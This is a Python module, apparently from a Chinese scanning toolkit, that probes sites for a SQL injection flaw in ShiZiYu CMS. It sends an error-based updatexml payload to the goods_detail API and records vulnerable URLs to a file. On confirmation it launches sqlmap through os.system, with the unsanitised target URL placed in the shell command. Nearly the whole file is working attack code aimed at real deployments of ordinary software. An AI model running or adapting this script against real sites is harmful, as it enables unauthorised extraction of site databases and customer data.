#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class ShiZiYu_Sql_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "XPATH" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("ShiZiYu", '目标存在狮子鱼CMS SQL漏洞')
                    OutPrintInfo("ShiZiYu", url)
                else:
                    OutPrintInfoSuc("ShiZiYu", f'目标存在狮子鱼CMS SQL漏洞: {url}')
                    OutPutFile("shiziyu_sql.txt",f'目标存在狮子鱼CMS SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ShiZiYu", f'目标不存在狮子鱼CMS SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("ShiZiYu",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ShiZiYu", '开始检测狮子鱼CMS SQL漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,*,0x7e),1)" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,*,0x7e),1)\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("ShiZiYu", '狮子鱼CMS SQL漏洞检测结束')

